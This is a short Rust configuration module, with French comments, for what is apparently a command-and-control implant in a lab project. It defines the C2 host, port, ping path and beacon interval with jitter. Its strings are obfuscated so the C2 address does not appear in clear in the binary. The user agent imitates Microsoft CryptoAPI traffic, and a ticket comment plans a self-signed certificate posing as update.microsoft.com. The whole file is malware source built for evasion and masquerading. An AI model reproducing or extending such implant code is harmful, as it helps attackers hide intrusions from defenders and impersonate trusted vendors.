use obfstr::obfstr;

// VIR-28 : HTTP pour test local
// VIR-30 : passer à "https" + port 8443 + cert auto-signé CN=update.microsoft.com

pub fn c2_scheme() -> String {
    obfstr!("http").to_string()
}

/// C2 host — IP obfusquée, absente en clair dans le binaire
/// Changer en 192.168.56.112 pour le lab
pub fn c2_host() -> String {
    obfstr!("127.0.0.1").to_string()
}

pub fn c2_port() -> u16 {
    8080 // VIR-30 : 8443 (HTTPS)
}

pub fn c2_ping_path() -> String {
    obfstr!("/ping").to_string()
}

/// Mimique le trafic Windows légitime (T1036.005)
pub fn user_agent() -> String {
    obfstr!("Microsoft-CryptoAPI/10.0").to_string()
}

/// Intervalle beacon de base (ms) — 5s + jitter ±2s
pub fn beacon_interval_ms() -> u64 {
    5_000
}
